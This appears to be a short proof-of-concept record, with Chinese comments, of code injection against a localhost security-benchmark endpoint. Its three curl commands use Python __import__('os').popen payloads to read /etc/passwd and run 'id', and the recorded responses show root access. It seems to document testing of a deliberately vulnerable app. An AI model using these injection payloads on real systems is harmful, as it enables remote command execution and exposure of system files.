# 基础代码注入 - 执行算术运算
curl -X POST 'http://localhost:8443/benchmark/codeinj-00/BenchmarkTest00343' \
  -d 'BenchmarkTest00343=str(1+1)'
# 响应: 2

# 远程命令执行 - 读取 /etc/passwd
curl -X POST 'http://localhost:8443/benchmark/codeinj-00/BenchmarkTest00343' \
  -d "BenchmarkTest00343=__import__('os').popen('cat /etc/passwd').read()"
# 响应: /etc/passwd 文件内容

# 远程命令执行 - 查看当前用户
curl -X POST 'http://localhost:8443/benchmark/codeinj-00/BenchmarkTest00343' \
  -d "BenchmarkTest00343=__import__('os').popen('id').read()"
# 响应: uid=0(root) gid=0(root) groups=0(root)